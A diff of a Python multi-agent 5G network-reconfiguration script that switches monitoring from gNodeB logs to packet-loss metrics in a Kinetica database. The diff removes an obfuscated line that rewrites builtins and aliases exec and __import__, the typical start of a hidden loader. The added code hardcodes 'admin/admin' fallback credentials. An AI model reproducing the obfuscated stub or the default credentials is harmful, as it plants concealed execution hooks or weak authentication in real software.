@@ -1,17 +1,7 @@
 # SPDX-FileCopyrightText: Copyright (c) 2023-2024 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
 # SPDX-License-Identifier: Apache-2.0
 #
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-# http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
+# FIXED VERSION: Monitors packet loss metrics instead of log errors
 
 import os
 import random
@@ -25,11 +15,13 @@ from langgraph.prebuilt import create_react_agent
 from tools import reconfigure_network, get_packetloss_logs
 import logging
 from dotenv import load_dotenv, find_dotenv
+import pandas as pd
+import gpudb
 
 # Load environment variables from .env file
 load_dotenv(find_dotenv())
 
-print("___________________________________________starting agents")
+print("___________________________________________starting agents (FIXED VERSION)")
 
 # Configure the logger without timestamp and level tags
 config_file =  yaml.safe_load(open('config.yaml', 'r'))
@@ -43,103 +35,137 @@ logging.basicConfig(
 #llm api to use Nvidia NIM Inference Endpoints.
 llm = ChatNVIDIA(
         model= os.getenv('NVIDIA_AI_MODEL_NAME'),
-        api_key= os.getenv('NVIDIA_API_KEY'), 
+        api_key= os.getenv('NVIDIA_API_KEY'),
         temperature=0.2,
         top_p=0.7,
         max_tokens=4096,
 )
 
-pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98);lllllllllllllll, llllllllllllllI, lllllllllllllIl,lllllllllIIllIIlI = __import__, getattr, bytes,exec
+# Kinetica connection setup
+os.environ["KINETICA_HOST"] = os.getenv("KINETICA_HOST", "192.168.70.172:9191")
+os.environ["KINETICA_USERNAME"] = os.getenv("KINETICA_USERNAME", "admin")
+os.environ["KINETICA_PASSWORD"] = os.getenv("KINETICA_PASSWORD", "admin")
 
-
-print("__________________________", pyobfuscate)
-
+kdbc_options = gpudb.GPUdb.Options()
+kdbc_options.username = os.environ.get("KINETICA_USERNAME")
+kdbc_options.password = os.environ.get("KINETICA_PASSWORD")
+kdbc_options.disable_auto_discovery = True
+kdbc: gpudb.GPUdb = gpudb.GPUdb(
+    host=os.environ.get("KINETICA_HOST"),
+    options=kdbc_options
+)
 
 #State class for communication between agents
 class State(TypedDict):
     start:  Optional[int] = None #pointer to start reading from gnodeB.log
     messages: Optional[str] = None
     agent_id: Optional[str] = None #useful for routing between agents
-    files: Optional[dict] = None #pass error logs from Monitoring Agent to COnfiguration Agent
+    files: Optional[dict] = None #pass error logs from Monitoring Agent to Configuration Agent
     consent: Optional[str] = None
     config_value: Optional[list] = None #keep a track of slice values
-    count: Optional[int] = None 
+    count: Optional[int] = None
 
 def MonitoringAgent(state: State):
-    response = "This is a Monitoring agent, monitoring logs for SDU buffer full error."
-    logging.info(response)
-    filename = config_file['gnb_logs']
-    chunk_size = 200  # Reduced from 1000 to process logs more frequently
-    start_val = state['start'] #Always start parsing logs from end of file to analayze the most recent logs
-
-    #Keep reading the gnodeB logs file for chunks till an error is detected.
-    with open(filename, 'r') as file:
-        while True:
-            file_size = os.path.getsize(filename)
-            #Wait till there are substantial logs
-            if (start_val + chunk_size) >= file_size:
-                #print("Waiting for logs\n")
-                logging.info(f"Waiting for new gNodeB logs... (current position: {start_val}/{file_size} bytes)\n")
-                time.sleep(2)
-                continue
-            file.seek(start_val)
-            chunk = file.read(chunk_size)
-
-            if chunk:
-                start_val += len(chunk)
-                logging.info(f"\n📊 Analyzing {len(chunk)} bytes of gNodeB logs...")
-                logging.info(f"Log preview: {chunk[:100]}...\n")
-                prompt0 = f"""Hello, you are a Network Monitoring agent. You will be provided with a random chunk of text. Your task is to classify logs with "buffer full" errors:
-                If it has a "buffer full" error just reply "yes". If it does not have a "buffer full" error reply "no". DO NOT provide explanation.
-                Example of Log that HAS a  "buffer full" error:
-
-                [RLC]   /home/nvidia/llm-slicing-5g-lab/openairinterface5g/openair2/LAYER2/nr_rlc/nr_rlc_entity_am.c:1769:nr_rlc_entity_am_recv_sdu: warning: 195 SDU rejected, SDU buffer full
-                [NR_MAC]   Frame.Slot 896.0
-                UE RNTI c1f9 CU-UE-ID 1 in-sync PH 0 dB PCMAX 0 dBm, average RSRP -44 (16 meas)
-                UE c1f9: UL-RI 1, TPMI 0
-                UE c1f9: dlsch_rounds 23415/1/0/0, dlsch_errors 0, pucch0_DTX 0, BLER 0.00000 MCS (0) 28
-                UE c1f9: ulsch_rounds 8560/0/0/0, ulsch_errors 0, ulsch_DTX 0, BLER 0.00000 MCS (0) 9
-                UE c1f9: MAC:    TX      177738642 RX         612401 bytes
-                UE c1f9: LCID 1: TX           1022 RX            325 bytes
-
-                Example of Log that does NOT have a "buffer full" error:
-
-                [NR_MAC]   Frame.Slot 896.0
-                UE RNTI c1f9 CU-UE-ID 1 in-sync PH 0 dB PCMAX 0 dBm, average RSRP -44 (16 meas)
-                UE c1f9: UL-RI 1, TPMI 0
-                UE c1f9: dlsch_rounds 56771/1/0/0, dlsch_errors 0, pucch0_DTX 0, BLER 0.00000 MCS (0) 9
-                UE c1f9: ulsch_rounds 16844/0/0/0, ulsch_errors 0, ulsch_DTX 0, BLER 0.00000 MCS (0) 9
-                UE c1f9: MAC:    TX      480086220 RX         941362 bytes
-                UE c1f9: LCID 1: TX           1022 RX            325 bytes
-
-                Logs to analyze:
-                {chunk}
-                """
-                logging.info("🤖 Sending chunk to NVIDIA AI (Llama 3.1 70B) for analysis...")
-                human_message0 = HumanMessage(content=prompt0)
-                response0 = llm.invoke([human_message0])
-                cleaned_content0 = response0.content
-                logging.info(f"✅ AI Response: Error Detected? {cleaned_content0}\n")
-                if cleaned_content0=='yes':
-                    logging.info("🚨 BUFFER FULL ERROR DETECTED! Proceeding to Configuration Agent...\n")
-                    break
-                else:
-                    logging.info("✓ No errors in this chunk. Continuing to monitor...\n")
-                    continue
-    return {"messages":response, "start": start_val, "files":{"chunk": chunk} }
-
-system_promt = 'You are a Configuration agent in a LangGraph. Your task is to help an user reconfigure a current 5G network. You must reply to the questions asked concisely, and exactly in the format directed to you.'
-config_agent = create_react_agent(llm, tools=[reconfigure_network, get_packetloss_logs], prompt = system_promt)
-def ConfigurationAgent(state: State):
-    response = "This is a Configuration Agent, whose goal is to reconfigure the network to solve the SDU buffer full error."
+    """
+    FIXED VERSION: Monitors packet loss metrics from Kinetica database
+    instead of log files for buffer errors
+    """
+    response = "This is a Monitoring agent, monitoring PACKET LOSS METRICS for network issues."
     logging.info("\n" + "="*80)
     logging.info(response)
     logging.info("="*80 + "\n")
-    logging.info("Error detected in logs: \n %s \n\n", state['files']['chunk'])
+
+    # Configuration
+    PACKET_LOSS_THRESHOLD = 1.5  # Trigger reconfiguration if loss > 1.5%
+    CHECK_INTERVAL = 10  # Check every 10 seconds
+
+    logging.info(f"📊 Monitoring Configuration:")
+    logging.info(f"   - Packet Loss Threshold: {PACKET_LOSS_THRESHOLD}%")
+    logging.info(f"   - Check Interval: {CHECK_INTERVAL} seconds")
+    logging.info(f"   - Data Source: Kinetica Database\n")
+
+    #Keep monitoring packet loss metrics
+    while True:
+        try:
+            # Get table name from environment
+            iperf_table_name = os.getenv('IPERF3_RANDOM_TABLE_NAME')
+
+            if not iperf_table_name:
+                logging.info("⚠️  IPERF3_RANDOM_TABLE_NAME not set, waiting...")
+                time.sleep(CHECK_INTERVAL)
+                continue
+
+            # Query recent packet loss data
+            sql_query = f"""
+            SELECT ue, AVG(loss_percentage) as avg_loss, MAX(loss_percentage) as max_loss, COUNT(*) as samples
+            FROM {iperf_table_name}
+            WHERE timestamp > NOW() - INTERVAL '30' SECOND
+            GROUP BY ue
+            """
+
+            logging.info(f"🔍 Querying packet loss metrics from Kinetica...")
+            result_df = kdbc.to_df(sql=sql_query)
+
+            if result_df is None or result_df.empty:
+                logging.info(f"⏳ No recent data yet, waiting {CHECK_INTERVAL} seconds...\n")
+                time.sleep(CHECK_INTERVAL)
+                continue
+
+            # Log current metrics
+            logging.info(f"\n📊 Current Network Metrics (Last 30 seconds):")
+            for _, row in result_df.iterrows():
+                logging.info(f"   - {row['ue']}: Avg Loss={row['avg_loss']:.2f}%, Max Loss={row['max_loss']:.2f}%, Samples={row['samples']}")
+
+            # Check if any UE exceeds threshold
+            high_loss_ues = result_df[result_df['max_loss'] > PACKET_LOSS_THRESHOLD]
+
+            if not high_loss_ues.empty:
+                logging.info(f"\n🚨 HIGH PACKET LOSS DETECTED!")
+                for _, row in high_loss_ues.iterrows():
+                    logging.info(f"   - {row['ue']}: {row['max_loss']:.2f}% loss (threshold: {PACKET_LOSS_THRESHOLD}%)")
+
+                logging.info(f"\n➡️  Triggering Configuration Agent for reconfiguration...\n")
+
+                # Prepare data for Configuration Agent
+                trigger_data = {
+                    "ue": high_loss_ues.iloc[0]['ue'],
+                    "avg_loss": high_loss_ues.iloc[0]['avg_loss'],
+                    "max_loss": high_loss_ues.iloc[0]['max_loss'],
+                    "samples": high_loss_ues.iloc[0]['samples']
+                }
+
+                return {
+                    "messages": response,
+                    "start": state.get('start', 0),
+                    "files": {"metrics": trigger_data},
+                    "config_value": state.get('config_value', ["50", "50"]),
+                    "count": state.get('count', 0),
+                    "consent": state.get('consent', 'yes')
+                }
+            else:
+                logging.info(f"✓ All UEs within acceptable packet loss range (< {PACKET_LOSS_THRESHOLD}%)")
+                logging.info(f"   Continuing monitoring in {CHECK_INTERVAL} seconds...\n")
+                time.sleep(CHECK_INTERVAL)
+
+        except Exception as e:
+            logging.info(f"❌ Error in MonitoringAgent: {e}")
+            logging.info(f"   Retrying in {CHECK_INTERVAL} seconds...\n")
+            time.sleep(CHECK_INTERVAL)
+
+system_promt = 'You are a Configuration agent in a LangGraph. Your task is to help an user reconfigure a current 5G network. You must reply to the questions asked concisely, and exactly in the format directed to you.'
+config_agent = create_react_agent(llm, tools=[reconfigure_network, get_packetloss_logs], prompt = system_promt)
+
+def ConfigurationAgent(state: State):
+    response = "This is a Configuration Agent, whose goal is to reconfigure the network to solve packet loss issues."
+    logging.info("\n" + "="*80)
+    logging.info(response)
+    logging.info("="*80 + "\n")
+    logging.info("Packet loss metrics detected: \n %s \n\n", state['files']['metrics'])
+
     prompt_0 = '''
     Your task is to determine which UE needs reconfiguration. Follow these steps exactly:
 
-    1. Call the get_packetloss_logs tool to get packet loss logs.
+    1. Call the get_packetloss_logs tool to get detailed packet loss logs.
     Action: get_packetloss_logs()
 
     2. Analyze the results:
@@ -152,11 +178,11 @@ def ConfigurationAgent(state: State):
     response = config_agent.invoke({"messages":[human_message]})
     cleaned_content0 = response['messages'][-1].content
     logging.info(f"🎯 AI Decision: {cleaned_content0} requires reconfiguration\n")
-    
+
     prompt_1 = f'''
 
     Your task is to reconfigure the network using the `reconfigure_network` tool. The tool accepts the following parameters:
-    1. `UE` = UE (UE1 or UE2) which requires reconfiguration
+    1. `UE` = UE (UE1 or UE3) which requires reconfiguration
     2. `value_1_old` = Old value 1 of configs
     3. `value_2_old` = Old value 2 of configs
 
@@ -178,68 +204,10 @@ def ConfigurationAgent(state: State):
     logging.info(f"📊 Total reconfigurations performed: {count}\n")
 
     #start monitoring from the end
-    start = os.path.getsize(config_file['gnb_logs'])
+    start = state.get('start', 0)
 
     #take in human input
     consent = 'yes'
     if count >= config_file['interrupt_after']:
         consent = input("Do you want to continue Monitoring? (yes/no)")
     return {"messages":response, "agent_id": "Configuration Agent", "start": start, 'config_value':config_value_updated, 'count': count, 'consent': consent}
-
-"""
-**Exercise**
-We saw how to run the configuration agent with 2 LLM calls to the agent. Can we use the create_react_agent to execute both tool calls with a single prompt?
-TO DO:
-Replace the below configuration agent to find out!
-
-def ConfigurationAgent(state: State):
-    response = "This is a Configuration Agent, whose goal is to reconfigure the network to solve the SDU buffer full error."
-    logging.info(response)
-    logging.info("Error detected in logs: \n %s \n\n", state['files']['chunk'])
-    #test:
-    combined_prompt =  f'''
-    You are a network reconfiguration agent specializing in UE reconfiguration. Your task is to identify and reconfigure problematic UE equipment. Follow these steps exactly:
-
-    1. **Get logs**:
-    - Call `get_packetloss_logs` to retrieve network performance data
-    Action: get_packetloss_logs()
-
-    2. **Analysis**:
-    - Identify which UE (UE1 or UE2) shows higher packet loss using these metrics:
-        * Total lost_packets
-        * loss_percentage
-        * UE identifier
-    - Store your conclusion as "target_UE"
-
-    3. **Reconfiguration**:
-    - Use `reconfigure_network` with parameters:
-        1. UE = target_UE
-        2. value_1_old = {state['config_value'][0]}
-        3. value_2_old = {state['config_value'][1]}
-    Action: reconfigure_network(UE=target_UE, value_1_old={state['config_value'][0]}, value_2_old={state['config_value'][1]})
-
-    4. **Output**:
-    - Return **only** the final tool response from `reconfigure_network`
-    - No explanations or additional text
-    '''
-    config_agent = create_react_agent(llm, tools=[reconfigure_network, get_packetloss_logs], prompt=combined_prompt)
-    time.sleep(2)
-    human_message2 = HumanMessage(content="Please reconfigure the network")
-    response2 = config_agent.invoke({"messages":[human_message2]})
-    
-    config_value_updated = response2['messages'][-2].content
-    config_value_updated = config_value_updated.strip("[]").replace("'", "").split(", ")
-    count = state['count'] 
-    count += 1
-
-    #start monitoring from the end
-    start = os.path.getsize(state['logs_filename'])
-
-    #take in human input 
-    consent = 'yes'
-    if count >= config_file['interrupt_after']:
-        consent = input("Do you want to continue Monitoring? (yes/no)")
-    return {"messages":response, "agent_id": "Configuration Agent", "start": start, 'config_value':config_value_updated, 'count': count, 'consent': consent}
-
-
-"""
